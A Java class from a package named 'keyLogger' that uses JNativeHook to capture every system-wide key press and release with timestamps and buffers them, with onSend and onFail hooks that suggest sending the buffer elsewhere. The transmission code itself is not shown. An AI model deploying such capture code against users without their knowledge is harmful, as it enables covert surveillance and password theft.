package scripts.keyLogger;

import java.util.ArrayList;
import java.util.List;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class NativeKeyboard implements NativeKeyListener{

	private List<KeyStorage> keys = new ArrayList<>();
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		keys.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		keys.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
	public void onSend() {
		keys.clear();
	}
	
	public void onFail() {
		System.out.println("Message Failed");
	}
	
	public List<KeyStorage> getKeys() {
		return keys;
	}

}
